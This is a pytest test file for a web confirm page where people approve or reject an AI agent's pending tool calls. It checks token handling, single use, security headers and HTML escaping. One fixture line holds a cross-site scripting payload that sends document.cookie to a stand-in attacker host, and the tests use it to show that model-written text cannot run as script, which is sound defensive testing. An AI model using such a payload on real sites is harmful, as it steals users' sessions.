"""The confirm page behind the approve and reject links: opening a link decides nothing, pressing the button does,
and nothing a model or tool wrote can run as script. No model and no network."""

from __future__ import annotations

import dataclasses
import os
import sys
from contextlib import nullcontext
from pathlib import Path
from urllib.parse import parse_qs, urlparse

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
os.environ.setdefault("ANTHROPIC_API_KEY", "sk-ant-placeholder-for-tests")

from fastapi.testclient import TestClient  # noqa: E402

from orchestrator import app as app_module  # noqa: E402
from orchestrator import decide_page  # noqa: E402
from orchestrator import store as store_module  # noqa: E402
from orchestrator.store import STATUS_AWAITING_APPROVAL, RunStore  # noqa: E402

ATTACK = "<script>fetch('https://evil.example/?c='+document.cookie)</script>"


@pytest.fixture
def setup(tmp_path, monkeypatch):
    monkeypatch.setattr(store_module, "settings", dataclasses.replace(store_module.settings, public_url="http://orch:8088"))
    store = RunStore(tmp_path / "runs")
    monkeypatch.setattr(app_module, "run_store", store)
    run = store.create("review_pr", {"repo": "a/b", "number": 1}, "semi")
    run.status = STATUS_AWAITING_APPROVAL
    run.pending = {"calls": [], "approvals": [
        {"tool_use_id": "t1", "tool": "gh_review_pull_request", "tier": "publish", "reason": "needs a person", "arguments": ATTACK}]}
    store.save(run)

    class Recorder:
        resumed = []

        async def resume(self, run, decisions, reviewer="human", note=""):
            Recorder.resumed.append((decisions, reviewer))
            run.status = "completed"
            run.pending = None
            store.save(run)
            return run

    Recorder.resumed = []
    monkeypatch.setattr(app_module, "engine", Recorder())
    client = TestClient(app_module.app)
    links = store.load(run.id).public()["approval_links"]
    return client, run, links, Recorder, store


def path_of(url: str) -> tuple[str, dict]:
    parsed = urlparse(url)
    return parsed.path, {k: v[0] for k, v in parse_qs(parsed.query).items()}


def post(client, run, decision, links, **override):
    form = {"decision": decision, "token": links[decision], "expires": links["expires"]}
    form.update(override)
    return client.post(f"/decide/{run.id}", data=form)


def test_the_run_view_has_ready_made_links_to_the_confirm_page_when_a_public_url_is_set(setup):
    _, run, links, _, _ = setup

    path, query = path_of(links["approve_url"])

    assert links["approve_url"].startswith("http://orch:8088/decide/")
    assert path == f"/decide/{run.id}" and query["decision"] == "approve" and query["token"] == links["approve"]


def test_no_public_url_means_no_ready_made_links(tmp_path):
    run = RunStore(tmp_path / "r").create("review_pr", {}, "semi")
    run.pending = {"approvals": [{"tool_use_id": "t1"}]}

    links = run.public()["approval_links"]

    assert "approve_url" not in links and set(links) == {"approve", "reject", "expires"}


def test_opening_the_link_shows_what_is_waiting_and_decides_nothing(setup):
    client, run, links, recorder, store = setup
    path, query = path_of(links["approve_url"])

    page = client.get(path, params=query)

    assert page.status_code == 200 and "gh_review_pull_request" in page.text and "needs a person" in page.text
    assert "Approve this run?" in page.text and '<form method="post">' in page.text
    assert recorder.resumed == [] and store.load(run.id).status == STATUS_AWAITING_APPROVAL


def test_pressing_the_button_records_the_decision(setup):
    client, run, links, recorder, _ = setup

    page = post(client, run, "approve", links, reviewer="Dana")

    assert page.status_code == 200 and "Decision recorded" in page.text and "completed" in page.text
    assert recorder.resumed == [({"t1": True}, "Dana")]


def test_a_reject_button_rejects_and_a_missing_name_is_recorded_as_a_link_click(setup):
    client, run, links, recorder, _ = setup

    post(client, run, "reject", links)

    assert recorder.resumed == [({"t1": False}, "link-click")]


def test_a_long_reviewer_name_is_cut(setup):
    client, run, links, recorder, _ = setup

    post(client, run, "approve", links, reviewer="x" * 500)

    assert len(recorder.resumed[0][1]) == 60


def test_what_a_model_wrote_in_a_pending_call_cannot_run_as_script(setup):
    client, run, links, _, _ = setup
    path, query = path_of(links["approve_url"])

    page = client.get(path, params=query)

    assert ATTACK not in page.text and "&lt;script&gt;" in page.text
    assert "script-src" not in page.headers["content-security-policy"] and "default-src 'none'" in page.headers["content-security-policy"]


def test_the_page_cannot_be_framed_cached_or_leak_the_token_in_a_referrer(setup):
    client, run, links, _, _ = setup
    path, query = path_of(links["approve_url"])

    headers = client.get(path, params=query).headers

    assert headers["x-frame-options"] == "DENY" and headers["referrer-policy"] == "no-referrer"
    assert headers["cache-control"] == "no-store" and "frame-ancestors 'none'" in headers["content-security-policy"]


def test_the_error_pages_carry_the_same_headers(setup):
    client, run, links, _, _ = setup

    page = client.get(f"/decide/{run.id}", params={"decision": "approve", "token": "bad", "expires": 1})

    assert page.status_code == 404 and page.headers["x-frame-options"] == "DENY"


@pytest.mark.parametrize("params", [
    {"token": "bad"},
    {"expires": 1},
    {"decision": "approve", "token": "0" * 64},
])
def test_a_bad_link_shows_a_page_that_says_nothing_about_why(setup, params):
    client, run, links, recorder, _ = setup
    query = {"decision": "approve", "token": links["approve"], "expires": links["expires"], **params}

    page = client.get(f"/decide/{run.id}", params=query)

    assert page.status_code == 404 and "no longer valid" in page.text and recorder.resumed == []


def test_an_unknown_run_and_a_bad_token_look_the_same(setup):
    client, run, links, _, _ = setup

    unknown = client.get("/decide/run_nope", params={"decision": "approve", "token": "x", "expires": 1})
    bad = client.get(f"/decide/{run.id}", params={"decision": "approve", "token": "x", "expires": 1})

    assert unknown.status_code == bad.status_code == 404 and unknown.text == bad.text


def test_an_approve_token_cannot_be_used_to_press_reject(setup):
    client, run, links, recorder, _ = setup

    page = post(client, run, "reject", links, token=links["approve"])

    assert page.status_code == 404 and recorder.resumed == []


def test_a_link_cannot_be_used_twice(setup):
    client, run, links, recorder, _ = setup
    first = post(client, run, "approve", links)

    second = post(client, run, "approve", links)

    assert first.status_code == 200 and second.status_code == 404
    assert len(recorder.resumed) == 1


def test_a_post_without_a_valid_decision_or_expiry_is_refused(setup):
    client, run, links, recorder, _ = setup

    merge = client.post(f"/decide/{run.id}", data={"decision": "merge", "token": links["approve"], "expires": links["expires"]})
    assert merge.status_code == 404
    assert post(client, run, "approve", links, expires="soon").status_code == 404
    assert recorder.resumed == []


def test_an_oversized_post_is_refused(setup):
    client, run, links, recorder, _ = setup

    page = post(client, run, "approve", links, reviewer="x" * 6000)

    assert page.status_code == 413 and recorder.resumed == []


def test_the_confirm_page_needs_no_service_token_but_the_rest_of_the_api_still_does(setup):
    client, run, links, _, _ = setup

    assert client.get("/runs").status_code == 401
    assert client.get(f"/runs/{run.id}").status_code == 401


def test_the_html_helpers_escape_everything_they_are_given():
    page = decide_page.confirm(
        {"run_id": '<b>"x"</b>', "playbook": "<i>", "pending_approvals": [
            {"tool": "<t>", "tier": "<u>", "reason": "<r>", "arguments": "<a>"}]},
        "approve", '"><x>', 1)

    assert "<b>" not in page and "<t>" not in page and "<a>" not in page and '"><x>' not in page
    assert "&quot;&gt;&lt;x&gt;" in page
    assert "<script" not in decide_page.message("<script>", "<script>") and "<script" not in decide_page.done(
        {"run_id": "<script>", "status": "<script>", "summary": "<script>"})
